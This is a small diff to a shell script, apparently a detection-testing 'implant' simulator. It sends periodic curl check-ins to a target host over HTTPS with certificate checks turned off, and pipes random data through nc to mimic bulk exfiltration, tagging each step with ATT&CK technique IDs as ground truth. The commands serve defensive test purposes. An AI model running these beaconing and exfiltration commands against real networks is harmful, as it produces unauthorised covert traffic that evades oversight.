@@ -7,7 +7,7 @@ sleep "${WARMUP:-60}"
 beacon() {
   local s; s=$(now)
   for _ in $(seq 1 "${BEACONS:-12}"); do
-    curl -s -o /dev/null --max-time 2 "http://$TARGET:8443/check-in" || true
+    curl -sk -o /dev/null --max-time 2 "https://$TARGET/check-in" || true   # self-signed cert
     sleep 60
   done
   gt BEACONING "\"$TARGET\"" "$s" "$(now)" detect '"T1071"'
@@ -31,6 +31,6 @@ for _ in 1 2 3; do
   head -c 200000000 /dev/urandom | nc -N -w 5 "$TARGET" 9000 || true
   sleep 5
 done
-gt NOVEL_BULK_UPLOAD "\"$TARGET\"" "$s" "$(now)" detect null
+gt NOVEL_BULK_UPLOAD "\"$TARGET\"" "$s" "$(now)" detect '"T1048"'
 wait
 echo "implant done"
